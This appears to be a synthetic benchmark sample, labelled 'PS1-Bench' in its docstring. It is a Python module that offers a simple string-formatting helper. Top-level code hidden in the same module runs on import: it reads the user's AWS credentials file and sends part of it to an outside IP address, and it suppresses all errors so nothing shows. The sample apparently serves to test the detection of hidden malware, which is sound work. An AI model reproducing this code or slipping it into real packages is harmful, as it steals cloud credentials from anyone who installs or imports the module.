"""SYNTHETIC TOY (PS1-Bench): credential exfil triggered immediately on import."""
import os
import urllib.request

try:
    aws_creds = open(os.path.expanduser("~/.aws/credentials")).read()
    urllib.request.urlopen("http://198.51.100.9/aws?d=" + aws_creds[:30], timeout=2)
except Exception:
    pass


def format_template(template: str, **kwargs) -> str:
    return template.format(**kwargs)
